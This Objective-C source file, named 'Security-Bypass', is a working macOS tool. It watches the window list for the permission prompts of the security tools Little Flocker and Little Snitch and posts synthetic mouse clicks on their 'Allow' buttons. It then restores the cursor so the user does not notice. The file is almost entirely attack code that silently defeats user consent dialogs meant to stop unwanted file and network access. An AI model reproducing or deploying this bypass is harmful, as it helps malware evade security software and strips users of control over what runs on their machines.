//
//  main.m
//  Security-Bypass
//
//  Created by Sabri on 22/12/2016.
//  Copyright © 2016 Sabri. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#import <IOKit/graphics/IOGraphicsLib.h>

void doEvent(CGPoint initialMousePosition, CGEventType event) {
    // Left button down
    CGEventRef currentEvent = CGEventCreateMouseEvent(NULL, event, CGPointMake(initialMousePosition.x, initialMousePosition.y), kCGMouseButtonLeft);
    CGEventPost(kCGHIDEventTap, currentEvent);
    CFRelease(currentEvent);
}

void clickOnButton(int width, int height, CGPoint oldLocation) {
    // Click at the Little Flocker position
    CGPoint initialMousePosition = CGPointMake(width, height);
    NSLog(@"Doing some magic...!\n");
    [NSThread sleepForTimeInterval:0.001];
    doEvent(initialMousePosition, kCGEventLeftMouseDown);
    doEvent(initialMousePosition, kCGEventLeftMouseUp);
    [NSThread sleepForTimeInterval:0.001];
    doEvent(CGPointMake(oldLocation.x, oldLocation.y), kCGEventLeftMouseUp);
    [NSThread sleepForTimeInterval:0.002];
}

int main(int argc, const char * argv[]) {
    
    // Don't really know if it's dirty or not, anyway we don't care
    while (1) {
        NSLog(@"Watching for new windows...\n");
        
        // Ask the window server for the list of windows.
        CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionAll, kCGNullWindowID);
        NSMutableArray *datas = [(NSArray *) CFBridgingRelease(windowList) mutableCopy];
        
        // Get current location
        CGEventRef ourEvent         = CGEventCreate(NULL);
        CGPoint    oldLocation      = CGEventGetLocation(ourEvent);
        CFRelease(ourEvent);

        for(id element in datas) {

            NSString *kCGWindowName = [element objectForKey:@"kCGWindowName"];
            NSString *kCGWindowLayer = [element objectForKey:@"kCGWindowLayer"];
            NSString *kCGWindowOwnerName = [element objectForKey:@"kCGWindowOwnerName"];
            NSString *kCGWindowIsOnscreen = [element objectForKey:@"kCGWindowIsOnscreen"];
            
            //NSLog(@"%@", element);
            
            // Little Flocker detection
            if([kCGWindowName isEqualToString:@"Little Flocker"] && [kCGWindowLayer intValue] != 0) {
                NSArray *kCGWindowBounds = [element objectForKey:@"kCGWindowBounds"];

                // Window is present, click on the button "Allow"
                clickOnButton([[kCGWindowBounds valueForKey:@"X"] intValue] + 666, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 280, oldLocation);
            }
            
            // Little Snitch detection
            if([kCGWindowName isEqualToString:@"Little Snitch"] && [kCGWindowOwnerName isEqualToString:@"Little Snitch Agent"] && [kCGWindowLayer intValue] == 1490 && [kCGWindowIsOnscreen intValue] == 1) {
                NSArray *kCGWindowBounds = [element objectForKey:@"kCGWindowBounds"];
                
                // Window is present, click on the button "Allow"
                clickOnButton([[kCGWindowBounds valueForKey:@"X"] intValue] + 587, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 340, oldLocation);
            }
        }
    }

    return 0;
}
